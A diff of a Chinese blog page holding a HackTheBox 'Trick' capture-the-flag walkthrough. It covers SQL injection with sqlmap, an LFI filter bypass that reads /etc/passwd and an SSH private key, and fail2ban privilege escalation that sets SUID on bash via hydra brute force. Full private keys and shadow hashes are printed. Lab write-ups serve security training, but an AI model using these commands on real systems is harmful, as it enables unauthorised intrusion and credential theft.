@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;477  10.10.11.166   端口扫描22，25，53，80: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.11.166Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 20">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;477  10.10.11.166                                                                                                              端口扫描22，25，53，80: 12">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Trick - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/06/29/Trick-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;477  10.10.11.166   端口扫描22，25，53，80: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.11.166Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 20">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;477  10.10.11.166                                                                                                              端口扫描22，25，53，80: 12">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062901.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062903.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022062904.jpg">
@@ -128,7 +128,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -218,12 +218,26 @@
 </li>
 <li><h2 id="10-10-11-166"><a href="#10-10-11-166" class="headerlink" title="10.10.11.166"></a>10.10.11.166</h2></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062901.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062901.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22，25，53，80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.166</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 13:21 CST</span><br><span class="line">Nmap scan report for 10.10.11.166</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line">Not shown: 996 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)</span><br><span class="line">|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)</span><br><span class="line">|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)</span><br><span class="line">25/tcp open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-title: Coming Soon - Start Bootstrap Theme</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 96.12 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>直接访问是Coming Soon：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062903.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062903.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="53-dns域传送"><a href="#53-dns域传送" class="headerlink" title="53 dns域传送"></a>53 dns域传送</h2><p>dns域传送获得几个域名：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dig @10.10.11.166 axfr trick.htb</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @10.10.11.166 axfr trick.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">trick.htb.		604800	IN	NS	trick.htb.</span><br><span class="line">trick.htb.		604800	IN	A	127.0.0.1</span><br><span class="line">trick.htb.		604800	IN	AAAA	::1</span><br><span class="line">preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.</span><br><span class="line">trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 688 msec</span><br><span class="line">;; SERVER: 10.10.11.166#53(10.10.11.166)</span><br><span class="line">;; WHEN: Wed Jun 29 13:29:18 CST 2022</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 203)</span><br></pre></td></tr></table></figure>
 
@@ -231,9 +245,23 @@
 <p>加hosts后访问</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.166 preprod-payroll.trick.htb trick.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062904.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062904.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="preprod-payroll"><a href="#preprod-payroll" class="headerlink" title="preprod-payroll"></a>preprod-payroll</h1><p>很容易发现sql注入：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062905.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062905.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>直接sqlmap,但得到的密码并不能登录：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=admin&amp;password=aaa" -v 3 --level 3</span><br><span class="line"></span><br><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] payroll_db</span><br><span class="line"></span><br><span class="line">Database: payroll_db</span><br><span class="line">[11 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| position            |</span><br><span class="line">| allowances          |</span><br><span class="line">| attendance          |</span><br><span class="line">| deductions          |</span><br><span class="line">| department          |</span><br><span class="line">| employee            |</span><br><span class="line">| employee_allowances |</span><br><span class="line">| employee_deductions |</span><br><span class="line">| payroll             |</span><br><span class="line">| payroll_items       |</span><br><span class="line">| users               |</span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+----+-----------+---------------+------+---------+---------+-----------------------+------------+</span><br><span class="line">| id | doctor_id | name          | type | address | contact | password              | username   |</span><br><span class="line">+----+-----------+---------------+------+---------+---------+-----------------------+------------+</span><br><span class="line">| 1  | 0         | Administrator | 1    | &lt;blank&gt; | &lt;blank&gt; | SuperGucciRainbowCake | Enemigosss |</span><br><span class="line">+----+-----------+---------------+------+---------+---------+-----------------------+------------+</span><br><span class="line"></span><br><span class="line">SuperGucciRainbowCake</span><br></pre></td></tr></table></figure>
 
@@ -244,12 +272,26 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed 's/^/preprod-/' ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &gt; subdomains.txt</span><br><span class="line"></span><br><span class="line">gobuster vhost -u http://trick.htb -w subdomains.txt -t 50</span><br><span class="line"></span><br><span class="line">Found: preprod-marketing.trick.htb (Status: 200) [Size: 9660]</span><br></pre></td></tr></table></figure>
 
 <h1 id="preprod-marketing"><a href="#preprod-marketing" class="headerlink" title="preprod-marketing"></a>preprod-marketing</h1><p>加入hosts后访问：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062906.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062906.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>根据page参数很容易猜到LFI，存在简单的过滤，可以双写绕过：</p>
 <p>(过滤规则也可以通过前面sql的文件读取读源码获得)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preprod-marketing.trick.htb&#x2F;index.php?page&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062907.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062907.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="michael-id-rsa"><a href="#michael-id-rsa" class="headerlink" title="michael_id_rsa"></a>michael_id_rsa</h2><p>这里有权限读取michael用户的私钥(前面的sql那里没权限读的)：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl "http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././..././home/michael/.ssh/id_rsa" &gt; michael_id_rsa</span><br></pre></td></tr></table></figure>
 
@@ -257,19 +299,47 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2&#x2F;+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz</span><br><span class="line">c4jtky6wYGzlxKHg&#x2F;Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G</span><br><span class="line">YQ2re&#x2F;gTrNElMAqURSCVydx&#x2F;UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+</span><br><span class="line">4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia&#x2F;</span><br><span class="line">Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws&#x2F;jgdxpDV9K3iDTPWXFwtK4</span><br><span class="line">1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b&#x2F;7uaC</span><br><span class="line">DkelLDMdnC73k2qHUa7j70&#x2F;6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0</span><br><span class="line">+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE</span><br><span class="line">hkXgenBG3VPvjCKiohfcQBgIJlx&#x2F;7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L</span><br><span class="line">jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6</span><br><span class="line">IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri&#x2F;dldDc3C</span><br><span class="line">aUZ9JF9u&#x2F;cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T&#x2F;mQYlmi&#x2F;</span><br><span class="line">KwkWcvbR2gTOlpgLZNRE&#x2F;GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC</span><br><span class="line">tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge</span><br><span class="line">U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0</span><br><span class="line">fHbE5GMyJf6+&#x2F;8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V</span><br><span class="line">PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS</span><br><span class="line">3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA</span><br><span class="line">fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT</span><br><span class="line">AuNHUSgX&#x2F;tcNxg1yYHeHTu868&#x2F;LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn</span><br><span class="line">In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a&#x2F;5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP</span><br><span class="line">JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ&#x2F;YzySvfVNPtSb0XN</span><br><span class="line">jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+</span><br><span class="line">IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用得到的私钥登录michael：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062908.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062908.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>很明显的提示，fail2ban：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062909.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062909.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>fail2ban被触发时会执行配置文件中预先定义的命令，所以大概就是修改配置文件自定义命令后重启服务，然后去触发fail2ban执行命令</p>
 <ul>
 <li>Privilege Escalation via fail2ban – Research Blog<br><a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/" target="_blank" rel="noopener">https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/</a></li>
 </ul>
 <p>查看配置目录也可以发现，虽然当前用户不能直接修改配置文件，但当前用户在security组中，对目录有操作权限，可以删除原有配置文件后创建新的配置文件：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062910.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062910.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="fail2ban-to-root"><a href="#fail2ban-to-root" class="headerlink" title="fail2ban to root"></a>fail2ban to root</h1><p> 修改配置文件后重启服务，然后去触发fail2ban执行命令：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">michael@trick:/tmp$ sed "s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf &gt; config.conf</span><br><span class="line">michael@trick:/tmp$ rm -f /etc/fail2ban/action.d/iptables-multiport.conf</span><br><span class="line">michael@trick:/tmp$ mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf</span><br><span class="line">michael@trick:/tmp$ sudo /etc/init.d/fail2ban restart</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 爆破，触发fail2ban</span></span><br><span class="line">hydra 10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062911.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022062911.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI&#x2F;FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::</span><br><span class="line">michael:$6$SPev7eFL5z0aKFf0$5iLTl9egsGGePEPUnNJlFyw8HHvTwqVC3&#x2F;THKzW2YD5ZPnbkN7pSOeOkXe9uiUHfOJegJdYT0j3Z9pz.FSX2y0:19104:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 <h2 id="root-id-rsa"><a href="#root-id-rsa" class="headerlink" title="root_id_rsa"></a>root_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAoSBXc6x1gauygp8zl8Y13QXTwj633MsMv&#x2F;0YsBzmGiHb1xBadkGC</span><br><span class="line">6a0abDxM4UycoYN82sT7N732cJqL9mWK7ZeGPQX4+RHD0fQnVQY3KCYak7RxQQtilsErhG</span><br><span class="line">VgovwAtnbaKA+tlfsO7IlD3Mv6lbJ&#x2F;ElD9drwhJOVdEf4IL+8SstVgd0AehVQgnLXd58MK</span><br><span class="line">7tuKX+a&#x2F;+eBBjzfpA6hWIzTT3koLnMoTWe5uCuhIJiaBUQyvrBQ1C&#x2F;M4E7rnHw6Rgh9x9d</span><br><span class="line">1LPInu0NMxbw0LAuFaQRcz3ewzEt8M2d639vedwahK5MyuTQS&#x2F;ZTt33yjoas40kv+NZ5Y0</span><br><span class="line">5vVeP6XxcwAAA8jXOo441zqOOAAAAAdzc2gtcnNhAAABAQChIFdzrHWBq7KCnzOXxjXdBd</span><br><span class="line">PCPrfcywy&#x2F;&#x2F;RiwHOYaIdvXEFp2QYLprRpsPEzhTJyhg3zaxPs3vfZwmov2ZYrtl4Y9Bfj5</span><br><span class="line">EcPR9CdVBjcoJhqTtHFBC2KWwSuEZWCi&#x2F;AC2dtooD62V+w7siUPcy&#x2F;qVsn8SUP12vCEk5V</span><br><span class="line">0R&#x2F;ggv7xKy1WB3QB6FVCCctd3nwwru24pf5r&#x2F;54EGPN+kDqFYjNNPeSgucyhNZ7m4K6Egm</span><br><span class="line">JoFRDK+sFDUL8zgTuucfDpGCH3H13Us8ie7Q0zFvDQsC4VpBFzPd7DMS3wzZ3rf2953BqE</span><br><span class="line">rkzK5NBL9lO3ffKOhqzjSS&#x2F;41nljTm9V4&#x2F;pfFzAAAAAwEAAQAAAQEAkxF9ITUZ8GjywC1m</span><br><span class="line">HzOpOHu4JIWwtxSTJ65x2VYXZWTgT7Y6i9QSFQ6OnpqPpdmS4g2tadYAY4m9plw6QoW+wE</span><br><span class="line">zdF1gbP+RKM5pCSGYq9DeLbKR392HX9DiPawJJqZqRX&#x2F;qt94EP9WS544cK7T82E2tgdyx7</span><br><span class="line">nePr8Mx2HhUcDfsbxQlRbM9oKqIBQ0v9GdBotvi+Ri&#x2F;IQfpEpmS64cU450&#x2F;DlrwQ358MU9</span><br><span class="line">i8so0KlnAHLYxgzhEzPjPehaRShcsRdhasw1&#x2F;xVKk7PoBvXzz9r+Ywo5b2htiYzqxt5N5i</span><br><span class="line">E8UOrUeYb7G21QjuhKB9KerukyGeHdBPjqvYuYjTwf2dUQAAAIEAnSUxZdekVLY0IoYPBF</span><br><span class="line">DBDIMkk97Kq2v8H51L9Q0rKBs79x4ZaV56LfMnTxuAxwnUMUauyPeGZFDgVsFwg0JK+vbR</span><br><span class="line">Kj9idBoMTOuDdfTE4IJtT3tEKClzFS9YSrYdQ78OUu8Kip3p5OuWfrzTuhRCKZ2cwd86WU</span><br><span class="line">ghEBWtHhn&#x2F;2RsAAACBANHocGFZWWM1DGtA3ZXiytuJLh7D55NUPk7jumm+qcF7UUiKaRHA</span><br><span class="line">QnQ44oxHssJbkGi4S3tvfSlXFtNboQCt3q5Wgc3wl4S+sBGoq1xsZuXAz&#x2F;3QX2AjXSpN&#x2F;S</span><br><span class="line">PkO+h4pk25aAFjGmAMMoH1Ty9v2X8ahYRY5EV8Y&#x2F;LRcMF32Z5rAAAAgQDEgb1hc85TS0Wz</span><br><span class="line">pmGTto+ok3eI&#x2F;10wxgbZXtdki7Jn1npNI5S7lh0r76jqEn5edcIYlwcUV+b6dCucDUhUHl</span><br><span class="line">7VT&#x2F;uoy+BKbanLzM809KCnuLCM7LDISk4N&#x2F;S79xiuFlrk11MrV2qaxZANiYEkOd1jKRGPi</span><br><span class="line">UDRYRn2lPX7WiLyrGQAAAApyb290QHRyaWNrAQIDBAUGBw&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
